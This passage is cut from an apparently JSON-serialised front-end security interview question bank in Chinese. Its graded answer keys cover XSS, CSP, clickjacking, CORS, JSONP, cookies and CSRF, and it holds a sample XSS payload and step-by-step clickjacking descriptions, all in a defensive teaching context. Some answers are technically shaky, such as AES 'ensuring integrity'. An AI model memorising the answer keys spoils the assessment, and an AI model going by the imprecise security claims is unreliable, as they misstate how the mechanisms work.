输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，<code>将&lt;转义为&amp;lt;，&gt;转义为&amp;gt;</code>。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。</p>\\n</li>\\n<li><p><strong>2：</strong> 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置<code>Content-Security-Policy: default- src&#39;self&#39;; script-src&#39;self&#39; https://trusted-scripts.com</code>。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和<code>https://trusted - scripts.com</code>。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为&#39;nonce-value&#39;或&#39;hash-value&#39;来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。</p>\\n</li>\\n<li><p><strong>2：</strong> 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式<code>（{{}}）</code>时会对内容进行 HTML 转义，防止脚本注入。</p>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>前端如何防止点击劫持？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。</li>\\n</ul>\\n<h2>在前端如何安全地处理用户密码？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=&quot;password&quot;来隐藏用户输入。</li>\\n<li><strong>1：</strong> 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。</li>\\n<li><strong>1：</strong> 避免本地缓存：设置表单元素的autocomplete=&quot;off&quot;，防止浏览器缓存密码。</li>\\n</ul>\\n<h2>假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。</li>\\n<li><strong>1：</strong> 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。</li>\\n<li><strong>1：</strong> 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。</li>\\n</ul>\\n<h2>什么是同源策略，它如何影响前端安全？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。</li>\\n<li><strong>1：</strong> 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。</li>\\n</ul>\\n<h2>同源策略相关的安全机制有哪些</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 <code>https://example.com</code>（协议为 https，域名是 example.com），要向 <code>https://api.example.com</code>（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端<code>（https://api.example.com）</code>如果要允许来自 <code>https://example.com</code> 的跨域请求，可以\\n配置响应头如下</li>\\n</ul>\\n<pre><code class=\\"language-js\\">Access-Control-Allow-Origin: https://example.com\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\\nAccess-Control-Allow-Headers: Content-Type\\n//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会\\n//知道这个跨域请求是被允许的，进而正常处理返回的数据。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 <code>https://parent.com</code> 中有一个 iframe 加载了 <code>https://child.com</code> 的页面。在 <code>https://parent.com</code> 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const iframe = document.getElementById(&#39;myIframe&#39;);\\niframe.contentWindow.postMessage(&#39;这是一条消息&#39;, &#39;https://child.com&#39;);\\n</code></pre>\\n<br/>\\n&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:\\n\\n<pre><code class=\\"language-js\\">window.addEventListener(&#39;message&#39;, function(event) {\\n    if (event.origin === &#39;https://parent.com&#39;) {\\n        console.log(&#39;收到来自父页面的消息：&#39;, event.data);\\n        // 可以在这里根据消息内容进行相应操作\\n    }\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 <code>&lt;script&gt;</code> 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 <code>&lt;script&gt;</code> 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 <code>https://api.example.com</code> 获取数据，在页面中可以这样写：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function handleData(data) {\\n    console.log(&#39;获取到的数据：&#39;, data);\\n}\\n&lt;script src=&quot;https://api.example.com/getData?callback=handleData&quot;&gt;&lt;/script&gt;\\n//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ &quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 20 }) 的内容，浏览\\n// 器加载这个 &lt;script&gt; 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用\\n// 较少，多被 CORS 等更安全的机制替代。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">http.createServer((req, res) =&gt; {\\n    res.writeHead(200, {\\n        &#39;Set-Cookie&#39;: &#39;myCookie=value; Domain=.example.com; SameSite=Lax; Path=/&#39;\\n    });\\n    res.end(&#39;Cookie已设置&#39;);\\n}).listen(3000);\\n//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。\\n//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# 前端安全\\n\\n","depth":1,"text":"前端安全","tokens":[{"type":"text","raw":"前端安全","text":"前端安全","escaped":false}]},{"type":"heading","raw":"## XSS 攻击\\n\\n","depth":2,"text":"XSS 攻击","tokens":[{"type":"text","raw":"XSS 攻击","text":"XSS 攻击","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】\\n- **:2** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】\\n","task":false,"loose":false,"text":"**:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","tokens":[{"type":"text","raw":"**:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","text":"**:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","text":" XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】","escaped":false}]}]},{"type":"list_item","raw":"- **:2** 防御：","task":false,"loose":false,"text":"**:2** 防御：","tokens":[{"type":"text","raw":"**:2** 防御：","text":"**:2** 防御：","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n >2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","tokens":[{"type":"paragraph","raw":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","text":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","tokens":[{"type":"text","raw":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。","text":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","text":"2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。","escaped":false}]}],"text":"1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  \\n2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSRF 攻击\\n\\n","depth":2,"text":"CSRF 攻击","tokens":[{"type":"text","raw":"CSRF 攻击","text":"CSRF 攻击","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。\\n- **:4** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。\\n","task":false,"loose":false,"text":"**:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","tokens":[{"type":"text","raw":"**:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","text":"**:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","text":" CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:4** 防御：","task":false,"loose":false,"text":"**:4** 防御：","tokens":[{"type":"text","raw":"**:4** 防御：","text":"**:4** 防御：","tokens":[{"type":"strong","raw":"**:4**","text":":4","tokens":[{"type":"text","raw":":4","text":":4","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、验证 HTTP 的 Referer 字段。  \\n >2、在请求地址中添加 token 并验证。  \\n >3、在 HTTP 头中自定义属性并验证。  \\n >4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  \\n >>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","tokens":[{"type":"paragraph","raw":"1、验证 HTTP 的 Referer 字段。  \\n2、在请求地址中添加 token 并验证。  \\n3、在 HTTP 头中自定义属性并验证。  \\n4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  \\n","text":"1、验证 HTTP 的 Referer 字段。  \\n2、在请求地址中添加 token 并验证。  \\n3、在 HTTP 头中自定义属性并验证。  \\n4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  ","tokens":[{"type":"text","raw":"1、验证 HTTP 的 Referer 字段。","text":"1、验证 HTTP 的 Referer 字段。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"2、在请求地址中添加 token 并验证。","text":"2、在请求地址中添加 token 并验证。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"3、在 HTTP 头中自定义属性并验证。","text":"3、在 HTTP 头中自定义属性并验证。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  ","text":"4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  ","escaped":false}]},{"type":"blockquote","raw":">get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","tokens":[{"type":"paragraph","raw":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","text":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","tokens":[{"type":"text","raw":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","text":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。","escaped":false}]}],"text":"get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。"}],"text":"1、验证 HTTP 的 Referer 字段。  \\n2、在请求地址中添加 token 并验证。  \\n3、在 HTTP 头中自定义属性并验证。  \\n4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  \\n>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## iframe 风险\\n\\n","depth":2,"text":"iframe 风险","tokens":[{"type":"text","raw":"iframe 风险","text":"iframe 风险","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。\\n- **:1** 防御：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。\\n","task":false,"loose":false,"text":"**:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","tokens":[{"type":"text","raw":"**:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","text":"**:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","text":" 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。","escaped":false}]}]},{"type":"list_item","raw":"- **:1** 防御：","task":false,"loose":false,"text":"**:1** 防御：","tokens":[{"type":"text","raw":"**:1** 防御：","text":"**:1** 防御：","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 防御：","text":" 防御：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","tokens":[{"type":"paragraph","raw":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","text":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","tokens":[{"type":"text","raw":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","text":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  ","escaped":false}]}],"text":"iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  "},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 点击劫持\\n\\n","depth":2,"text":"点击劫持","tokens":[{"type":"text","raw":"点击劫持","text":"点击劫持","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。\\n- **:2** 通常的攻击步骤是这样的：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。\\n","task":false,"loose":false,"text":"**:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","tokens":[{"type":"text","raw":"**:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","text":"**:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","tokens":[{"type":"strong","raw":"**:1**","text":":1","tokens":[{"type":"text","raw":":1","text":":1","escaped":false}]},{"type":"text","raw":" 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","text":" 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。","escaped":false}]}]},{"type":"list_item","raw":"- **:2** 通常的攻击步骤是这样的：","task":false,"loose":false,"text":"**:2** 通常的攻击步骤是这样的：","tokens":[{"type":"text","raw":"**:2** 通常的攻击步骤是这样的：","text":"**:2** 通常的攻击步骤是这样的：","tokens":[{"type":"strong","raw":"**:2**","text":":2","tokens":[{"type":"text","raw":":2","text":":2","escaped":false}]},{"type":"text","raw":" 通常的攻击步骤是这样的：","text":" 通常的攻击步骤是这样的：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n >2、将我们的页面放入到 iframe 当中。  \\n >3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n >4、把 iframe 设置为100%透明度。  \\n >5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","tokens":[{"type":"paragraph","raw":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  \\n2、将我们的页面放入到 iframe 当中。  \\n3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  \\n4、把 iframe 设置为100%透明度。  \\n5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。","text":"1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  